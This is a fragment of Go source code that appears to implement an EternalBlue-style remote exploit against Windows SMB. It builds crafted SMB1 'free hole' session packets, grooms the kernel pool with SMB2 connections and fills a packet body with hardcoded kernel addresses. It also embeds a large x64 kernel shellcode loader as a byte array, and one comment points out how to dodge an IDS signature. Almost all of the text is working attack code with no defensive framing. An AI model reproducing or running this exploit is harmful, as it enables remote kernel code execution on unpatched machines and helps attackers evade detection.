	buf.Write(userIDBuf)
	// multiplex id
	buf.Write([]byte{0x40, 0x00})

	// --------Echo Request--------

	// word count
	buf.WriteByte(0x01)
	// echo count
	buf.Write([]byte{0x01, 0x00})
	// byte count
	buf.Write([]byte{0x0C, 0x00})
	// echo data
	// this is an existing IDS signature, and can be null out
	buf.Write([]byte{0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x00})

	return buf.Bytes()
}

func smb1FreeHole(address string, start bool) (net.Conn, error) {
	conn, err := net.Dial("tcp", address)
	if err != nil {
		return nil, fmt.Errorf("failed to connect host: %s", err)
	}
	var ok bool
	defer func() {
		if !ok {
			_ = conn.Close()
		}
	}()
	err = smbClientNegotiate(conn)
	if err != nil {
		return nil, fmt.Errorf("failed to negotiate: %s", err)
	}
	var (
		flags2   []byte
		vcNum    []byte
		nativeOS []byte
	)
	if start {
		flags2 = []byte{0x07, 0xC0}
		vcNum = []byte{0x2D, 0x01}
		nativeOS = []byte{0xF0, 0xFF, 0x00, 0x00, 0x00}
	} else {
		flags2 = []byte{0x07, 0x40}
		vcNum = []byte{0x2C, 0x01}
		nativeOS = []byte{0xF8, 0x87, 0x00, 0x00, 0x00}
	}
	packet := makeSMB1FreeHoleSessionPacket(flags2, vcNum, nativeOS)
	_, err = conn.Write(packet)
	if err != nil {
		const format = "failed to send smb1 free hole session packet: %s"
		return nil, fmt.Errorf(format, err)
	}
	_, _, err = smb1GetResponse(conn)
	if err != nil {
		return nil, err
	}
	ok = true
	return conn, nil
}

func makeSMB1FreeHoleSessionPacket(flags2, vcNum, nativeOS []byte) []byte {
	buf := bytes.Buffer{}

	// --------NetBIOS Session Service--------

	// message type
	buf.WriteByte(0x00)
	// length
	buf.Write([]byte{0x00, 0x00, 0x51})

	// --------Server Message Block Protocol--------
	// SMB1
	buf.Write([]byte{0xFF, 0x53, 0x4D, 0x42})

	buf.WriteByte(0x73)

	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})

	buf.WriteByte(0x18)

	buf.Write(flags2)
	
	buf.Write([]byte{0x00, 0x00})

	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})

	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})

	buf.Write([]byte{0x00, 0x00})

	buf.Write([]byte{0x00, 0x00})

	buf.Write([]byte{0xFF, 0xFE})

	buf.Write([]byte{0x00, 0x00})

	buf.Write([]byte{0x40, 0x00})

	// --------Session Setup AndX Request--------


	buf.WriteByte(0x0C)

	buf.WriteByte(0xFF)

	buf.WriteByte(0x00)

	buf.Write([]byte{0x00, 0x00})

	buf.Write([]byte{0x04, 0x11})

	buf.Write([]byte{0x0A, 0x00})

	buf.Write(vcNum)

	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})

	buf.Write([]byte{0x00, 0x00})

	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})

	buf.Write([]byte{0x00, 0x00, 0x00, 0x80})

	buf.Write([]byte{0x16, 0x00})

	buf.Write(nativeOS)

	buf.Write(makeZero(17))
	return buf.Bytes()
}

func smb2Grooms(address string, grooms int) ([]net.Conn, error) {
	header := makeSMB2Header()
	var (
		conns []net.Conn
		ok    bool
	)
	defer func() {
		if ok {
			return
		}
		for i := 0; i < len(conns); i++ {
			_ = conns[i].Close()
		}
	}()
	for i := 0; i < grooms; i++ {
		conn, err := net.Dial("tcp", address)
		if err != nil {
			return nil, fmt.Errorf("failed to connect target: %s", err)
		}
		_, err = conn.Write(header)
		if err != nil {
			return nil, fmt.Errorf("failed to send SMB2 header: %s", err)
		}
		conns = append(conns, conn)
	}
	ok = true
	return conns, nil
}

func makeSMB2Header() []byte {
	buf := bytes.Buffer{}
	buf.Write([]byte{0x00, 0x00, 0xFF, 0xF7, 0xFE})
	buf.WriteString("SMB")
	buf.Write(makeZero(124))
	return buf.Bytes()
}

const (
	packetMaxLen   = 4204
	packetSetupLen = 497
)

func makeSMB2Body(payload []byte) []byte {
	const packetMaxPayload = packetMaxLen - packetSetupLen
	buf := bytes.Buffer{}
	buf.Write(makeZero(0x08))
	buf.Write([]byte{0x03, 0x00, 0x00, 0x00})
	buf.Write(makeZero(0x1C))
	buf.Write([]byte{0x03, 0x00, 0x00, 0x00})
	buf.Write(makeZero(0x74))

	x64Address := []byte{0xb0, 0x00, 0xd0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}
	buf.Write(bytes.Repeat(x64Address, 2))
	buf.Write(makeZero(0x10))
	x86Address := []byte{0xC0, 0xF0, 0xDF, 0xFF}
	buf.Write(bytes.Repeat(x86Address, 2))
	buf.Write(makeZero(0xC4))

	buf.Write([]byte{0x90, 0xF1, 0xDF, 0xFF})
	buf.Write(makeZero(0x04))
	buf.Write([]byte{0xF0, 0xF1, 0xDF, 0xFF})
	buf.Write(makeZero(0x40))
	buf.Write([]byte{0xF0, 0x01, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF})
	buf.Write(makeZero(0x08))
	buf.Write([]byte{0x00, 0x02, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF})
	buf.WriteByte(0x00)
	buf.Write(payload)
	buf.Write(makeZero(packetMaxPayload - len(payload)))

	return buf.Bytes()
}

func makeZero(size int) []byte {
	return bytes.Repeat([]byte{0}, size)
}
 
var loader = [...]byte{
	0x31, 0xC9, 0x41, 0xE2, 0x01, 0xC3, 0xB9, 0x82, 0x00, 0x00, 0xC0, 0x0F, 0x32, 0x48, 0xBB, 0xF8,
	0x0F, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x89, 0x53, 0x04, 0x89, 0x03, 0x48, 0x8D, 0x05, 0x0A,
	0x00, 0x00, 0x00, 0x48, 0x89, 0xC2, 0x48, 0xC1, 0xEA, 0x20, 0x0F, 0x30, 0xC3, 0x0F, 0x01, 0xF8,
	0x65, 0x48, 0x89, 0x24, 0x25, 0x10, 0x00, 0x00, 0x00, 0x65, 0x48, 0x8B, 0x24, 0x25, 0xA8, 0x01,
	0x00, 0x00, 0x50, 0x53, 0x51, 0x52, 0x56, 0x57, 0x55, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41,
	0x53, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x6A, 0x2B, 0x65, 0xFF, 0x34, 0x25, 0x10,
	0x00, 0x00, 0x00, 0x41, 0x53, 0x6A, 0x33, 0x51, 0x4C, 0x89, 0xD1, 0x48, 0x83, 0xEC, 0x08, 0x55,
	0x48, 0x81, 0xEC, 0x58, 0x01, 0x00, 0x00, 0x48, 0x8D, 0xAC, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48,
	0x89, 0x9D, 0xC0, 0x00, 0x00, 0x00, 0x48, 0x89, 0xBD, 0xC8, 0x00, 0x00, 0x00, 0x48, 0x89, 0xB5,
	0xD0, 0x00, 0x00, 0x00, 0x48, 0xA1, 0xF8, 0x0F, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x48, 0x89,
	0xC2, 0x48, 0xC1, 0xEA, 0x20, 0x48, 0x31, 0xDB, 0xFF, 0xCB, 0x48, 0x21, 0xD8, 0xB9, 0x82, 0x00,
	0x00, 0xC0, 0x0F, 0x30, 0xFB, 0xE8, 0x38, 0x00, 0x00, 0x00, 0xFA, 0x65, 0x48, 0x8B, 0x24, 0x25,
	0xA8, 0x01, 0x00, 0x00, 0x48, 0x83, 0xEC, 0x78, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C,
	0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5D, 0x5F, 0x5E, 0x5A, 0x59, 0x5B, 0x58, 0x65,
	0x48, 0x8B, 0x24, 0x25, 0x10, 0x00, 0x00, 0x00, 0x0F, 0x01, 0xF8, 0xFF, 0x24, 0x25, 0xF8, 0x0F,
	0xD0, 0xFF, 0x56, 0x41, 0x57, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x53, 0x55, 0x48, 0x89, 0xE5,
	0x66, 0x83, 0xE4, 0xF0, 0x48, 0x83, 0xEC, 0x20, 0x4C, 0x8D, 0x35, 0xE3, 0xFF, 0xFF, 0xFF, 0x65,
	0x4C, 0x8B, 0x3C, 0x25, 0x38, 0x00, 0x00, 0x00, 0x4D, 0x8B, 0x7F, 0x04, 0x49, 0xC1, 0xEF, 0x0C,
	0x49, 0xC1, 0xE7, 0x0C, 0x49, 0x81, 0xEF, 0x00, 0x10, 0x00, 0x00, 0x49, 0x8B, 0x37, 0x66, 0x81,
	0xFE, 0x4D, 0x5A, 0x75, 0xEF, 0x41, 0xBB, 0x5C, 0x72, 0x11, 0x62, 0xE8, 0x18, 0x02, 0x00, 0x00,
	0x48, 0x89, 0xC6, 0x48, 0x81, 0xC6, 0x08, 0x03, 0x00, 0x00, 0x41, 0xBB, 0x7A, 0xBA, 0xA3, 0x30,
	0xE8, 0x03, 0x02, 0x00, 0x00, 0x48, 0x89, 0xF1, 0x48, 0x39, 0xF0, 0x77, 0x11, 0x48, 0x8D, 0x90,
	0x00, 0x05, 0x00, 0x00, 0x48, 0x39, 0xF2, 0x72, 0x05, 0x48, 0x29, 0xC6, 0xEB, 0x08, 0x48, 0x8B,
	0x36, 0x48, 0x39, 0xCE, 0x75, 0xE2, 0x49, 0x89, 0xF4, 0x31, 0xDB, 0x89, 0xD9, 0x83, 0xC1, 0x04,
	0x81, 0xF9, 0x00, 0x00, 0x01, 0x00, 0x0F, 0x8D, 0x66, 0x01, 0x00, 0x00, 0x4C, 0x89, 0xF2, 0x89,
	0xCB, 0x41, 0xBB, 0x66, 0x55, 0xA2, 0x4B, 0xE8, 0xBC, 0x01, 0x00, 0x00, 0x85, 0xC0, 0x75, 0xDB,
	0x49, 0x8B, 0x0E, 0x41, 0xBB, 0xA3, 0x6F, 0x72, 0x2D, 0xE8, 0xAA, 0x01, 0x00, 0x00, 0x48, 0x89,
	0xC6, 0xE8, 0x50, 0x01, 0x00, 0x00, 0x41, 0x81, 0xF9, 0xBF, 0x77, 0x1F, 0xDD, 0x75, 0xBC, 0x49,
	0x8B, 0x1E, 0x4D, 0x8D, 0x6E, 0x10, 0x4C, 0x89, 0xEA, 0x48, 0x89, 0xD9, 0x41, 0xBB, 0xE5, 0x24,
	0x11, 0xDC, 0xE8, 0x81, 0x01, 0x00, 0x00, 0x6A, 0x40, 0x68, 0x00, 0x10, 0x00, 0x00, 0x4D, 0x8D,
	0x4E, 0x08, 0x49, 0xC7, 0x01, 0x00, 0x10, 0x00, 0x00, 0x4D, 0x31, 0xC0, 0x4C, 0x89, 0xF2, 0x31,
	0xC9, 0x48, 0x89, 0x0A, 0x48, 0xF7, 0xD1, 0x41, 0xBB, 0x4B, 0xCA, 0x0A, 0xEE, 0x48, 0x83, 0xEC,
	0x20, 0xE8, 0x52, 0x01, 0x00, 0x00, 0x85, 0xC0, 0x0F, 0x85, 0xC8, 0x00, 0x00, 0x00, 0x49, 0x8B,
	0x3E, 0x48, 0x8D, 0x35, 0xE9, 0x00, 0x00, 0x00, 0x31, 0xC9, 0x66, 0x03, 0x0D, 0xD7, 0x01, 0x00,
	0x00, 0x66, 0x81, 0xC1, 0xF9, 0x00, 0xF3, 0xA4, 0x48, 0x89, 0xDE, 0x48, 0x81, 0xC6, 0x08, 0x03,
	0x00, 0x00, 0x48, 0x89, 0xF1, 0x48, 0x8B, 0x11, 0x4C, 0x29, 0xE2, 0x51, 0x52, 0x48, 0x89, 0xD1,
	0x48, 0x83, 0xEC, 0x20, 0x41, 0xBB, 0x26, 0x40, 0x36, 0x9D, 0xE8, 0x09, 0x01, 0x00, 0x00, 0x48,
	0x83, 0xC4, 0x20, 0x5A, 0x59, 0x48, 0x85, 0xC0, 0x74, 0x18, 0x48, 0x8B, 0x80, 0xC8, 0x02, 0x00,
	0x00, 0x48, 0x85, 0xC0, 0x74, 0x0C, 0x48, 0x83, 0xC2, 0x4C, 0x8B, 0x02, 0x0F, 0xBA, 0xE0, 0x05,
	0x72, 0x05, 0x48, 0x8B, 0x09, 0xEB, 0xBE, 0x48, 0x83, 0xEA, 0x4C, 0x49, 0x89, 0xD4, 0x31, 0xD2,
	0x80, 0xC2, 0x90, 0x31, 0xC9, 0x41, 0xBB, 0x26, 0xAC, 0x50, 0x91, 0xE8, 0xC8, 0x00, 0x00, 0x00,
	0x48, 0x89, 0xC1, 0x4C, 0x8D, 0x89, 0x80, 0x00, 0x00, 0x00, 0x41, 0xC6, 0x01, 0xC3, 0x4C, 0x89,
	0xE2, 0x49, 0x89, 0xC4, 0x4D, 0x31, 0xC0, 0x41, 0x50, 0x6A, 0x01, 0x49, 0x8B, 0x06, 0x50, 0x41,
	0x50, 0x48, 0x83, 0xEC, 0x20, 0x41, 0xBB, 0xAC, 0xCE, 0x55, 0x4B, 0xE8, 0x98, 0x00, 0x00, 0x00,
	0x31, 0xD2, 0x52, 0x52, 0x41, 0x58, 0x41, 0x59, 0x4C, 0x89, 0xE1, 0x41, 0xBB, 0x18, 0x38, 0x09,
	0x9E, 0xE8, 0x82, 0x00, 0x00, 0x00, 0x4C, 0x89, 0xE9, 0x41, 0xBB, 0x22, 0xB7, 0xB3, 0x7D, 0xE8,
	0x74, 0x00, 0x00, 0x00, 0x48, 0x89, 0xD9, 0x41, 0xBB, 0x0D, 0xE2, 0x4D, 0x85, 0xE8, 0x66, 0x00,
	0x00, 0x00, 0x48, 0x89, 0xEC, 0x5D, 0x5B, 0x41, 0x5C, 0x41, 0x5D, 0x41, 0x5E, 0x41, 0x5F, 0x5E,
	0xC3, 0xE9, 0xB5, 0x00, 0x00, 0x00, 0x4D, 0x31, 0xC9, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D,
	0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xEC, 0xC3, 0x31, 0xD2,
	0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x12,
	0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x45, 0x31, 0xC9, 0x31, 0xC0, 0xAC, 0x3C,
	0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xEE, 0x45, 0x39,
	0xD9, 0x75, 0xDA, 0x4C, 0x8B, 0x7A, 0x20, 0xC3, 0x4C, 0x89, 0xF8, 0x41, 0x51, 0x41, 0x50, 0x52,
	0x51, 0x56, 0x48, 0x89, 0xC2, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00,
	0x00, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44, 0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0x48,
	0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0xE8, 0x78, 0xFF, 0xFF, 0xFF, 0x45, 0x39,
	0xD9, 0x75, 0xEC, 0x58, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48,
	0x44, 0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x5E, 0x59,
	0x5A, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5B, 0x41, 0x53, 0xFF, 0xE0, 0x56, 0x41, 0x57, 0x55, 0x48,
	0x89, 0xE5, 0x48, 0x83, 0xEC, 0x20, 0x41, 0xBB, 0xDA, 0x16, 0xAF, 0x92, 0xE8, 0x4D, 0xFF, 0xFF,
	0xFF, 0x31, 0xC9, 0x51, 0x51, 0x51, 0x51, 0x41, 0x59, 0x4C, 0x8D, 0x05, 0x1A, 0x00, 0x00, 0x00,
	0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0xBB, 0x46, 0x45, 0x1B, 0x22, 0xE8, 0x68, 0xFF, 0xFF, 0xFF,
	0x48, 0x89, 0xEC, 0x5D, 0x41, 0x5F, 0x5E, 0xC3,
}